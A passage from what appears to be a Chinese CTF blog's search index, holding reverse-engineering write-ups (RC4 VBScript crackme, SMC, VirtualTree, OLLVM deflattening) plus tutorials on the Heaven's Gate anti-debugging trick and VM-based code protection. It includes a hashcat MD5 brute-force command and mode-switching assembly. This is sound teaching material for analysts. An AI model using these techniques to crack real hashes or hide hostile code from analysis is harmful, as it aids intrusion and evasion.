Len(strPwd)) + 1, 1))) Mod 256 tempSwap = box(i) box(i) = box(a) box(a) = tempSwap Next RC4_init = boxEnd FunctionFunction MD5(strToHash) Dim tmpFile, strCommand, objFSO, objWshShell, out Set objFSO = CreateObject(&quot;Scripting.FileSystemObject&quot;) Set objWshShell = CreateObject(&quot;WScript.Shell&quot;) tmpFile = objFSO.GetSpecialFolder(2).Path &amp; &quot;\\&quot; &amp; objFSO.GetTempName objFSO.CreateTextFile(tmpFile).Write(strToHash) strCommand = &quot;certutil -hashfile &quot; &amp; tmpFile &amp; &quot; MD5&quot; out = objWshShell.Exec(strCommand).StdOut.ReadAll objFSO.DeleteFile tmpFile MD5 = Replace(Split(Trim(out), vbCrLf)(1), &quot; &quot;, &quot;&quot;)End FunctionFunction RC4(box, strData) Dim tempSwap Dim a Dim b Dim x Dim y Dim encryptedData encryptedData = &quot;&quot; For x = 1 To Len(strData) a = (a + 1) Mod 256 b = (b + box(a)) Mod 256 tempSwap = box(a) box(a) = box(b) box(b) = tempSwap y = Asc(Mid(strData, x, 1)) Xor box((box(a) + box(b)) Mod 256) encryptedData = encryptedData &amp; LCase(Right(&quot;0&quot; &amp; Hex(y), 2)) Next RC4 = encryptedDataEnd Functionmsgbox &quot;Do you know VBScript?&quot;msgbox &quot;VBScript (&quot;&quot;Microsoft Visual Basic Scripting Edition&quot;&quot;) is a deprecated Active Scripting language developed by Microsoft that is modeled on Visual Basic.&quot;msgbox &quot;It allows Microsoft Windows system administrators to generate powerful tools for managing computers without error handling and with subroutines and other advanced programming constructs. It can give the user complete control over many aspects of their computing environment.&quot;msgbox &quot;Interestingly, although VBScript has long since been deprecated, you can still run VBScript scripts on the latest versions of Windows 11 systems.&quot;msgbox &quot;A VBScript script must be executed within a host environment, of which there are several provided with Microsoft Windows, including: Windows Script Host (WSH), Internet Explorer (IE), and Internet Information Services (IIS).&quot;msgbox &quot;For .vbs files, the host is Windows Script Host (WSH), aka wscript.exe/cscript.exe program in your system.&quot;msgbox &quot;If you can not stop a VBScript from running (e.g. a dead loop), go to the task manager and kill wscript.exe/cscript.exe.&quot;msgbox &quot;cscript and wscript are executables for the scripting host that are used to run the scripts. cscript and wscript are both interpreters to run VBScript (and other scripting languages like JScript) on the Windows platform.&quot;msgbox &quot;cscript is for console applications and wscript is for Windows applications. It has something to do with STDIN, STDOUT and STDERR.&quot;msgbox &quot;OK! Now, let us begin our journey.&quot;key = InputBox(&quot;Enter the key:&quot;, &quot;CTF Challenge&quot;)if (key = False) then wscript.quitif (len(key)&lt;&gt;6) then wscript.echo &quot;wrong key length!&quot; wscript.quitend ifIf (MD5(key) = md5_key) Then wscript.echo &quot;You get the key!Move to next challenge.&quot;Else wscript.echo &quot;Wrong key!Try again!&quot; wscript.quitEnd IfuserInput = InputBox(&quot;Enter the flag:&quot;, &quot;CTF Challenge&quot;)if (userInput = False) then wscript.quitif (len(userInput)&lt;&gt;44) then wscript.echo &quot;wrong!&quot; wscript.quitend ifbox = RC4_init(key)encryptedInput = RC4(box, userInput)If (encryptedInput = enc_flag) Then MsgBox &quot;Congratulations! You have learned VBS!&quot;Else MsgBox &quot;Wrong flag. Try again.&quot;End Ifwscript.echo &quot;bye!&quot;&#x27; enc_flag = 0x59fc6b263c3d0fcbc331ade699e62d3473bbf85522d588e3423e6c751ca091528a3c0186e460483917192c14&#x27; md5(key) = baacc7ffa8232d28f814bb14c428798b RC4加密，key只有md5后的哈希，用hashcat爆破拿到key 解密： 123456789101112131415161718192021222324# ./hashcat.exe -a 3 -m 0 -d 1 &quot;baacc7ffa8232d28f814bb14c428798b&quot; ?a?a?a?a?a?adef rc4_decrypt(key, ciphertext): S = list(range(256)) j = 0 out = [] for i in range(256): j = (j + S[i] + key[i % len(key)]) % 256 S[i], S[j] = S[j], S[i] i = j = 0 for char in ciphertext: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] out.append(char ^ S[(S[i] + S[j]) % 256]) return bytes(out)key = &#x27;H&amp;NKEY&#x27;ciphertext = bytes.fromhex(&#x27;59fc6b263c3d0fcbc331ade699e62d3473bbf85522d588e3423e6c751ca091528a3c0186e460483917192c14&#x27;)plaintext = rc4_decrypt(key.encode(), ciphertext)print(plaintext) H&amp;NCTF{VBS_1s_@_s0_7unny_an4_pow3rfu1_t00l!} Reverse-hnwanna找到主函数，申清加密逻辑： 写解密代码： 12345678910111213141516171819202122232425#include &lt;cstdio&gt;void a(char* input, int shift)&#123; char text[19]; printf(&quot;H&amp;NCTF&#123;&quot;); for(int i = 0; i &lt; 18; i++) &#123; if(input[i] &gt;= &#x27;a&#x27; &amp;&amp; input[i] &lt;= &#x27;z&#x27;) text[i] = ((char)(((int)(input[i] - &#x27;a&#x27;) + shift) % 26 + 97)); else text[i] += input[i]; printf(&quot;%c&quot;, text[i]); &#125; printf(&quot;&#125;&quot;);&#125;int main()&#123; char enc[] = &quot;justaeasyunitygame&quot;; int key = 5; a(enc, key); return 0;&#125; H&amp;NCTF{ozxyfjfxdzsnydlfrj} Reverse-DO YOU KNOW SWDD?在异常处发现有SMC，找到SMC函数： 写IDC脚本解密： 得到加密函数： 解密： 1234567891011121314151617181920212223242526272829#include &lt;cstdio&gt;int main()&#123; char enc[] = &quot;S_VYFO_CGNN_GRKD_KLYED_IYE&quot;; int v4 = 10; printf(&quot;H&amp;NCTF&#123;&quot;); for(int i = 0; enc[i]; ++i) &#123; if(enc[i] &gt;= 65 &amp;&amp; enc[i] &lt;= 90) enc[i] = (enc[i] - v4 + 65) % 26 + 65; printf(&quot;%c&quot;, enc[i]); &#125; printf(&quot;&#125;&quot;); return 0;&#125;/*#include &lt;idc.idc&gt;static main()&#123; auto addr = 0x00417001; auto i = 0; auto j = 0; auto v5 = &quot;swdd&quot;; for(j = addr; j &lt; 0x0041815B; j++) PatchByte(j, Byte(j) ^ 4);&#125;*/ H&amp;NCTF{I_LOVE_SWDD_WHAT_ABOUT_YOU} Reverse-最喜欢的逆向题自己看图： H&amp;NCTF{Do_Y0u_like_F5_1n_Rev}","categories":[{"name":"比赛WP","slug":"比赛WP","permalink":"http://example.com/categories/%E6%AF%94%E8%B5%9BWP/"}],"tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://example.com/tags/WriteUp/"}]},{"title":"敲响天堂之门","slug":"Reverse/Gate-of-Heaven","date":"2024-04-11T14:33:51.000Z","updated":"2024-05-11T05:17:07.263Z","comments":true,"path":"2024/04/11/Reverse/Gate-of-Heaven/","permalink":"http://example.com/2024/04/11/Reverse/Gate-of-Heaven/","excerpt":"","text":"“天堂之门”介绍：天堂之门技术（Heaven’s Gate）是依靠操作系统提供的在不同位数CPU进行跨架构的指令调用（SysWoW64），这使得32位和64位的指令环境可以放在同一个程序中，但是目前的调试器包括IDA在内很少有能跨架构调试的，这使得IDA的反汇编和调试都不能正常进行。 一个在动态调试层面恐怕是最有难度的逆向反调试 架构之间的切换：首先我们要知道32位寄存器cs的值是0x22，64位cs寄存器的值是0x33，我们将cs的值在这两者间切换，便达到了跨架构运行程序的目的。 那么我们如何更改寄存器cs的值呢？我们知道，mov指令是无法直接改变cs寄存器的值的，需要借助 call和 retf来实现cs段的切换 call far和retf(ret far)是可以同时改变cs和ip的： 1234push 0x33 ;0x33作为cs的新值call $+5 ;下一条指令的地址入栈add dword [esp], 5 ;+5后即是指向retf的下一条指令retf ;跳转到下一条指令，同时pop is和pop cs 或者： 1jmp far 33:地址 这样就实现了将cs改为0x33的功能，即从32位跳转到64位。 对应的从64位跳转到32位的指令是： 1234call $+5mov dword [rsp + 4], 0x23add dword [rsp], 0xDretf so，对cs的更改可以让程序在32位和64之间切换。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;malloc.h&gt;int main()&#123; _asm &#123; _emit 0x6A // push 0x33 _emit 0x33 _emit 0xE8 // call $+5 _emit 0x05 _emit 0x00 _emit 0x00 _emit 0x00 _emit 0x83 // add dword [esp], 5 _emit 0x04 _emit 0x24 _emit 0x05 _emit 0xCB // retf &#125; printf(&quot;进入64位\\n&quot;); _asm &#123; _emit 0xE8 // call $+5 _emit 0x00 _emit 0x00 _emit 0x00 _emit 0x00 _emit 0xC7 // mov dword [rsp + 4], 0x23 _emit 0x44 _emit 0x24 _emit 0x04 _emit 0x23 _emit 0x00 _emit 0x00 _emit 0x00 _emit 0x83 // add dword [rsp], 0xD _emit 0x04 _emit 0x24 _emit 0x0D _emit 0xCB // retf &#125; printf(&quot;回到32位\\n&quot;); return 0;&#125; 未完待续…","categories":[{"name":"Reverse","slug":"Reverse","permalink":"http://example.com/categories/Reverse/"}],"tags":[{"name":"Re分享","slug":"Re分享","permalink":"http://example.com/tags/Re%E5%88%86%E4%BA%AB/"}]},{"title":"MRCTF2020 VirtualTree（花指令+动态调试）","slug":"Reverse/VirtualTree","date":"2024-04-10T14:27:36.000Z","updated":"2024-04-11T13:11:36.569Z","comments":true,"path":"2024/04/10/Reverse/VirtualTree/","permalink":"http://example.com/2024/04/10/Reverse/VirtualTree/","excerpt":"","text":"[MRCTF2020]VirtualTree（花指令+动态调试）32位无壳，放进IDA里，main函数很清晰， 试着恢复一下符号表： 看一下key的调用，找到更改key值的函数， 结合题目，可以看出这是一个二叉树，搞一个结构体： 回头看第一个加密函数： 就是把key中的数据根input一个一个异或，比较简单， 把input搞成0，动调可以搞到key的数据 1key = &quot;MLGPOKFCJENIHDBA&quot; 再分析enc2:，有花指令，比较容易去掉： 去掉后里面的加密函数是这样： 逆向这个函数解密后发现根本解不出来，动调一下试试： 动调后发现这些函数全被更改了，汇编是这样的： call的那些函数是对input执行了一些简单的更改。 汇编： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990.text:004216F0 push ebp.text:004216F1 mov ebp, esp.text:004216F3 push 0Ah.text:004216F5 push 0.text:004216F7 mov eax, offset func_add.text:004216FC call eax ; loc_421510 //input[0] += 10.text:004216FC.text:004216FE add esp, 8.text:00421701 push 2.text:00421703 push 1.text:00421705 mov eax, offset func_xor.text:0042170A call eax ; loc_421510 //input[1] ^= input[2].text:0042170A.text:0042170C add esp, 8.text:0042170F push 7.text:00421711 push 2.text:00421713 mov eax, offset func_add.text:00421718 call eax ; loc_421510 //input[2] += 7.text:00421718.text:0042171A add esp, 8.text:0042171D push 7.text:0042171F push 3.text:00421721 mov eax, offset func_sub.text:00421726 call eax ; loc_421510 //input[3] = abs(input[3] - input[7]).text:00421726.text:00421728 add esp, 8.text:0042172B push 5.text:0042172D push 4.text:0042172F mov eax, offset func_xor.text:00421734 call eax ; loc_421510 //input[4] ^= input[5].text:00421734.text:00421736 add esp, 8.text:00421739 push 1.text:0042173B push 6.text:0042173D mov eax, offset func_sub.text:00421742 call eax ; loc_421510 //input[6] = abs(input[6] - input[1]).text:00421742.text:00421744 add esp, 8.text:00421747 push 3.text:00421749 push 7.text:0042174B mov eax, offset func_add.text:00421750 call eax ; loc_421510 //input[7] += 3.text:00421750.text:00421752 add esp, 8.text:00421755 push 7.text:00421757 push 8.text:00421759 mov eax, offset func_xor.text:0042175E call eax ; loc_421510 //input[8] ^= input[7].text:0042175E.text:00421760 add esp, 8.text:00421763 push 8.text:00421765 push 9.text:00421767 mov eax, offset func_sub.text:0042176C call eax ; loc_421510 //input[9] = abs(input[9] - input[8]).text:0042176C.text:0042176E add esp, 8.text:00421771 push 7.text:00421773 push 0Ah.text:00421775 mov eax, offset func_sub.text:0042177A call eax ; loc_421510 //input[10] = abs(input[10] - input[7]).text:0042177A.text:0042177C add esp, 8.text:0042177F push 0Ch.text:00421781 push 0Bh.text:00421783 mov eax, offset func_xor.text:00421788 call eax ; loc_421510 //input[11] ^= input[12].text:00421788.text:0042178A add esp, 8.text:0042178D push 2.text:0042178F push 0Ch.text:00421791 mov eax, offset func_sub.text:00421796 call eax ; loc_421510 //input[12] = abs(input[12] - input[2]).text:00421796.text:00421798 add esp, 8.text:0042179B push 0Fh.text:0042179D push 0Eh.text:0042179F mov eax, offset func_xor.text:004217A4 call eax ; loc_421510 //input[14] ^= input[15].text:004217A4.text:004217A6 add esp, 8.text:004217A9 push 2.text:004217AB push 0Fh.text:004217AD mov eax, offset func_add.text:004217B2 call eax ; loc_421510 //input[15] += 2.text:004217B2.text:004217B4 add esp, 8.text:004217B7 nop.text:004217B8 nop.text:004217B9 pop ebp.text:004217BA retn 写解密代码： 12345678910111213141516171819202122232425262728293031input = [0x17, 0x63, 0x77, 0x03, 0x52, 0x2E, 0x4A, 0x28, 0x52, 0x1B, 0x17, 0x12, 0x3A, 0x0A, 0x6C, 0x62]def add(a, b): input[a] -= bdef xor(a, b): input[a] ^= input[b]def sub(a, b): # maybe_input1.append(input[a] + input[b]) # maybe_input2.append(input[b] - input[a]) input[a] = abs(input[a] - input[b]) # 因为abs有两种可能性，全取这种可能得到的flag最正常key = &quot;MLGPOKFCJENIHDBA&quot;opcode = [1, 2, 1, 3, 2, 3, 1, 2, 3, 3, 2, 3, 2, 1] # 1表示加密中的add, 2表示xor, 3表示suba1 = [0, 1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 14, 15] # 第一个参数a2 = [10, 2, 7, 7, 5, 1, 3, 7, 8, 7, 12, 2, 15, 2] # 第二个参数for i in range(13, -1, -1): if opcode[i] == 1: add(a1[i], a2[i]) elif opcode[i] == 2: xor(a1[i], a2[i]) elif opcode[i] == 3: sub(a1[i], a2[i])for i in range(16): input[i] ^= ord(key[i])for i in input: print(chr(i), end = &#x27;&#x27;) 得到flag： MRCTF{@_7r3e_f0r_fuNN!}","categories":[{"name":"Reverse","slug":"Reverse","permalink":"http://example.com/categories/Reverse/"}],"tags":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}]},{"title":"去OLLVM平坦化([SUCTF2019]hardCPP)","slug":"Reverse/LLVM","date":"2024-03-26T14:46:39.000Z","updated":"2024-04-11T13:53:32.020Z","comments":true,"path":"2024/03/26/Reverse/LLVM/","permalink":"http://example.com/2024/03/26/Reverse/LLVM/","excerpt":"","text":"去OLLVM平坦化([SUCTF2019]hardCPP)用ida打开是这样 十分有十二分的平坦化痕迹， 上次强网杯遇到过，但是因为当时没装好环境，deflat.py跑不出来，遗憾放弃。 这次又碰见不想再回避，打开这个网址把脚本装下来，https://github.com/Pure-T/deflat，看readme，要先装一个angr库（这个库在做VM虚拟机类题，写解析器脚本的时候也会很有用，以后可能再写） 1pip install angr 下载时间可能会有点长， 官方说的是用8.19.4.5版本，实际较新版本依然可用， 装好后用以下指令去平坦化： 12python deflat.py hardCpp 0x4007E0 #python + deflat.py + 文件名 + 起始地址(基本就是main函数的地址) 然而出错： 回看readme， 下载那个graph.py然后改名为am_graph.py ，将其与deflat.py放在同一目录下， 再次运行相同命令： 12python deflat.py hardCpp 0x4007E0 #python + deflat.py + 文件名 + 起始地址(基本就是main函数的地址) 期间可能会出现大量类似警告： 不要害怕，只要最后是这样就好： 将recovered的文件再放进ida里面看： 成功！ 下面就是逆向环节了也有部分去平坦化操作 首先排除上面这两个循环有用， 看到这一坨函数不要怕，其实就是c++里面的奇奇怪怪的东西（好像叫lambda表达式），来看看他们到底是干嘛的， 在对各函数分析的过程中发现在0x401310、0x4014E0和0x4016C0依然有平坦化，再跑脚本去一下， 1python deflat.py hardCpp_recovered 0x401310 0x401310： 再跑一遍 1python deflat.py hardCpp_recovered_recovered 0x4016C0 0x4016C0： 再跑一遍： 1python deflat.py hardCpp_recovered_recovered_recovered 0x4014E0 0x4014E0： 得到hardCPP_recovered_recovered_recovered_recovered 这次再放进ida并改名： 接下来就是搞清func1、func2、func3的功能： 其中两个就是是return第二个数据，另一个是add， 把这几个函数简化成表达式： 是不是已经非常清晰了！ 整理一下： 1v18 = (3 * (18 ^ input[i - 1 + v21]) + 2) ^ ((v21 ^ input[i]) + (input[i - 1 + v21] % 7)) 从前面看出：v21大概是0 （真的是大概，当时我也不太确定） 然后等式左边的v18就是enc[i]那么这个算法显然可逆： 把函数开头的md5解密一下： 那么flag（input）的第一位是‘#’ 好了可以写解密代码了： 12345678910enc = [0xF3, 0x2E, 0x18, 0x36, 0xE1, 0x4C, 0x22, 0xD1, 0xF9, 0x8C, 0x40, 0x76, 0xF4, 0x0E, 0x00, 0x05, 0xA3, 0x90, 0x0E, 0xA5]input = &#x27;#&#x27;k = len(input)for j in range(len(enc)): input += chr(((enc[j] ^ ((ord(input[j]) ^ 18) * 3 + 2)) - (ord(input[j]) % 7)) &amp; 0xff)print(input) flag： flag{mY-CurR1ed_Fns}","categories":[{"name":"Reverse","slug":"Reverse","permalink":"http://example.com/categories/Reverse/"}],"tags":[{"name":"Re分享","slug":"Re分享","permalink":"http://example.com/tags/Re%E5%88%86%E4%BA%AB/"},{"name":"刷题记录","slug":"刷题记录","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}]},{"title":"浅谈VM虚拟机","slug":"Reverse/aboutvm","date":"2024-03-26T14:43:22.000Z","updated":"2024-04-14T08:09:33.551Z","comments":true,"path":"2024/03/26/Reverse/aboutvm/","permalink":"http://example.com/2024/03/26/Reverse/aboutvm/","excerpt":"","text":"浅谈VM虚拟机1. 什么是虚拟机？ 虚拟机：自己定义一套指令，在程序中能有一套函数和结构解释自己定义的指令并执行功能。 查一下维基百科 虚拟机（英语：virtual machine），在计算机科学中的体系结构里，是指一种特殊的软件，可以在计算机平台和终端用户之间创建一种环境，而终端用户则是基于虚拟机这个软件所创建的环境来操作其它软件。虚拟机（VM）是计算机系统的仿真器，通过软件模拟具有完整硬件系统功能的、运行在一个完全隔离环境中的完整计算机系统，能提供物理计算机的功能。 有不同种类的虚拟机，每种虚拟机具有不同的功能： 系统虚拟机（也称为全虚拟化虚拟机）可代替物理计算机。它提供了运行整个操作系统所需的功能。虚拟机监视器（hypervisor）共享和管理硬件，从而允许有相互隔离但存在于同一物理机器上的多个环境。现代虚拟机监视器使用虚拟化专用硬件（主要是主机CPU）来进行硬件辅助虚拟化。 程序虚拟机 被设计用来在与平台无关的环境中执行计算机程序。 而我们CTF中遇到的虚拟机一般是这种： vm（虚拟机保护）是一种基于虚拟机的代码保护技术。他将基于x86汇编系统中的可执行代码转换为字节码指令系统的代码。来达到不被轻易篡改和逆向的目的。 2. 虚拟机的运行原理要搞清虚拟机的运行原理，最好的方法是手搓一个虚拟机出来： 一般虚拟机分为基于寄存器的虚拟机和基于栈的虚拟机，通过数据存储处理的方式区分，二者的区别可以看这里 栈式虚拟机和寄存器式虚拟机？ 这里先写一个简单的寄存器虚拟机， 实现虚拟机时，要做好这么几个步骤： 寄存器虚拟机需要初始化好栈空间和寄存器空间 定义一套opcode 实现opcode功能的模块 定义opcode和寄存器： 1234567891011121314enum regist&#123; R1 = 0xe1, R2 = 0xe2, R3 = 0xe3,&#125;;enum opcodes&#123; MOV = 0xf1, XOR = 0xf2, RET = 0xf4, READ = 0xf5,&#125;; 定义vm相关变量： 1234567891011121314typedef struct&#123; unsigned char opcode; void (*handle)(void*); //handler执行器&#125;vm_opcode;typedef struct vm_cpus&#123; int r1; int r2; int r3; unsigned char* eip; //指向opcode的指针 vm_opcode op_list[OPCODE_N]; //opcode列表，存储opcode和其对应的操作函数&#125;vm_cpu; 初始化vm各项数据，并使opcode关联handler功能函数 12345678910111213141516171819void vm_init(vm_cpu* cpu)&#123; cpu-&gt;r1 = 0; cpu-&gt;r2 = 0; cpu-&gt;r3 = 0; cpu-&gt;eip = (unsigned char*)vm_code; cpu-&gt;op_list[0].opcode = 0xf1; cpu-&gt;op_list[0].handle = (void (*)(void*))mov; //0xf1对应mov cpu-&gt;op_list[1].opcode = 0xf2; cpu-&gt;op_list[1].handle = (void (*)(void*))xor1; //0xf2对应xor cpu-&gt;op_list[2].opcode = 0xf5; cpu-&gt;op_list[2].handle = (void (*)(void*))read1; //0xf1对应read vm_stack = (char*)malloc(0x512); memset(vm_stack, 0, 0x512); //开辟栈空间&#125; vm启动函数： 123456void vm_start(vm_cpu* cpu)&#123; cpu-&gt;eip = (unsigned char*)vm_code; while((*cpu-&gt;eip) != RET) //持续执行opcode直到ret vm_dispatcher(cpu);&#125; 执行器： 123456789void vm_dispatcher(vm_cpu* cpu)&#123; for(int i = 0; i &lt; OPCODE_N; i++) if(*cpu-&gt;eip == cpu-&gt;op_list[i].opcode) &#123; cpu-&gt;op_list[i].handle(cpu); break; &#125;&#125; 再写出opcode： 123456789101112131415161718192021222324252627282930unsigned char vm_code[] = &#123; 0xf5, 0xf1,0xe1,0x0,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0x0,0x00,0x00,0x00, 0xf1,0xe1,0x1,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0x1,0x00,0x00,0x00, 0xf1,0xe1,0x2,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0x2,0x00,0x00,0x00, 0xf1,0xe1,0x3,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0x3,0x00,0x00,0x00, 0xf1,0xe1,0x4,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0x4,0x00,0x00,0x00, 0xf1,0xe1,0x5,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0x5,0x00,0x00,0x00, 0xf1,0xe1,0x6,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0x6,0x00,0x00,0x00, 0xf1,0xe1,0x7,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0x7,0x00,0x00,0x00, 0xf1,0xe1,0x8,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0x8,0x00,0x00,0x00, 0xf1,0xe1,0x9,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0x9,0x00,0x00,0x00, 0xf1,0xe1,0xa,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0xa,0x00,0x00,0x00, 0xf1,0xe1,0xb,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0xb,0x00,0x00,0x00, 0xf1,0xe1,0xc,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0xc,0x00,0x00,0x00, 0xf1,0xe1,0xd,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0xd,0x00,0x00,0x00, 0xf1,0xe1,0xe,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0xe,0x00,0x00,0x00, 0xf1,0xe1,0xf,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0xf,0x00,0x00,0x00, 0xf1,0xe1,0x10,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0x10,0x00,0x00,0x00, 0xf1,0xe1,0x11,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0x11,0x00,0x00,0x00, 0xf1,0xe1,0x12,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0x12,0x00,0x00,0x00, 0xf1,0xe1,0x13,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0x13,0x00,0x00,0x00, 0xf1,0xe1,0x14,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0x14,0x00,0x00,0x00, 0xf1,0xe1,0x15,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0x15,0x00,0x00,0x00, 0xf1,0xe1,0x16,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0x16,0x00,0x00,0x00, 0xf1,0xe1,0x17,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0x17,0x00,0x00,0x00, 0xf1,0xe1,0x18,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0x18,0x00,0x00,0x00, 0xf1,0xe1,0x19,0x00,0x00,0x00, 0xf2, 0xf1,0xe4,OFFEST + 0x19,0x00,0x00,0x00, 0xf4&#125;; 寄存器虚拟机完成。 3. 给个实例，出个小题上面的虚拟机大概实现的就是这个过程 1234567call read1MOV R1,flag[i]XOR R1 0x12MOV [OFFEST],R1; //循环len(flag)次ret 也就是实现了 12for(int i = 0; i &lt; strlen(flag); i++) flag[i] ^= 0x12; 的功能。 把源码放在这： maybeVM 4. 如何破解VM虚拟机保护类题目 解题一般步骤： 分析VM结构-&gt;分析opcode-&gt;编写parser-&gt;re算法 VM结构常见类型： 基于栈、基于队列、基于信号量 opcode： 与VM数据结构对应的指令 ：push pop 运算指令：add、sub、mul等 示例1链接：[NewStarCTF 2023 公开赛道]茶 用来简单了解VM原理 ——by me 示例2链接：[watevrCTF 2019]Repyc——WriteUp pyc+混淆+VM虚拟机 ——by me","categories":[{"name":"Reverse","slug":"Reverse","permalink":"http://example.com/categories/Reverse/"}],"tags":[{"name":"Re分享","slug":"Re分享","permalink":"http://example.com/tags/Re%E5%88%86%E4%BA%AB/"},{"name":"刷题记录","slug":"刷题记录","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}]}],"categories":[{"name":"比赛WP","slug":"比赛WP","permalink":"http://example.com/categories/%E6%AF%94%E8%B5%9BWP/"},{"name":"Reverse","slug":"Reverse","permalink":"http://example.com/categories/Reverse/"}],"tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://example.com/tags/WriteUp/"},{"name":"Re分享","slug":"Re分享","permalink":"http://example.com/tags/Re%E5%88%86%E4%BA%AB/"},{"name":"刷题记录","slug":"刷题记录","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}]}